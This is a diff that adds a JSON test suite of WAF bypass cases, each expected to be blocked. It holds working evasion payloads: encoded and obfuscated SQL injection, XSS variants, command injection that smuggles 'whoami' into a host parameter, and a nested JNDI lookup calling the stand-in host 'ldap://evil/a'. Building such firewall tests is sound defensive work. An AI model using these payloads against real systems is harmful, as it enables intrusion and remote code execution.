@@ -1,0 +1,24 @@
+{
+  "category": "bypass",
+  "comment": "编码/混淆对抗集：专挑公开的 WAF 绕过手法，验证归一化层与规则层能否兜住。全部期望拦截。",
+  "cases": [
+    {"name": "全 URL 编码 1' or 1=1", "location": "url", "expect": "block", "path": "/sqli?id=%31%27%20%6f%72%20%31%3d%31"},
+    {"name": "大小写交错 SeLeCt fRoM", "location": "url", "expect": "block", "path": "/sqli?id=1%20uNiOn%20SeLeCt%201%20fRoM%20users"},
+    {"name": "注释穿插 Un/**/IoN", "location": "url", "expect": "block", "path": "/sqli?id=1%20Un/**/IoN%20Se/**/LeCt%201"},
+    {"name": "MySQL 版本注释 /*!50000union*/", "location": "url", "expect": "block", "path": "/sqli?id=1%20/*!50000union*/%20select%201,2"},
+    {"name": "制表符分隔 union%09select", "location": "url", "expect": "block", "path": "/sqli?id=1%20union%09select%201,2"},
+    {"name": "换行分隔 union%0aselect", "location": "url", "expect": "block", "path": "/sqli?id=1%20union%0aselect%201,2"},
+    {"name": "空字节截断 union%00select", "location": "url", "expect": "block", "path": "/sqli?id=1%00union%00select%201,2"},
+    {"name": "全角字符 ｕｎｉｏｎ", "location": "url", "expect": "block", "path": "/sqli?id=1%20%EF%BD%95%EF%BD%8E%EF%BD%89%EF%BD%8F%EF%BD%8E%20%EF%BD%93%EF%BD%85%EF%BD%8C%EF%BD%85%EF%BD%83%EF%BD%94%201,2"},
+    {"name": "参数污染 HPP 同名参数", "location": "url", "expect": "block", "path": "/sqli?id=1&id=1%20union%20select%201,2"},
+    {"name": "X-Forwarded-For 头注入", "location": "header", "expect": "block", "path": "/sqli?id=1", "headers": {"X-Forwarded-For": "1 union select 1,2"}},
+    {"name": "嵌套 JSON 深层注入", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "{\"filter\":{\"q\":\"union select 1,2\"}}", "content_type": "application/json"},
+    {"name": "XSS 十六进制实体", "location": "url", "expect": "block", "path": "/xss?q=%26%23x3c%3Bscript%26%23x3e%3Balert(1)"},
+    {"name": "XSS 无引号事件处理 onerror=alert(1)", "location": "url", "expect": "block", "path": "/xss?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"},
+    {"name": "XSS 反引号替代括号", "location": "url", "expect": "block", "path": "/xss?q=%3Csvg%20onload%3Dalert%601%60%3E"},
+    {"name": "命令注入 $IFS 无花括号", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%24IFS%20whoami"},
+    {"name": "命令注入 CRLF 换行", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%0D%0Awhoami"},
+    {"name": "命令注入 引号+拼接", "location": "url", "expect": "block", "path": "/ping?host=127.0.0.1%3Bw%27h%27o%27a%27m%27i"},
+    {"name": "代码注入 JNDI 嵌套变量绕过", "location": "header", "expect": "block", "path": "/calc", "headers": {"X-Api-Version": "${${lower:j}ndi:ldap://evil/a}"}}
+  ]
+}
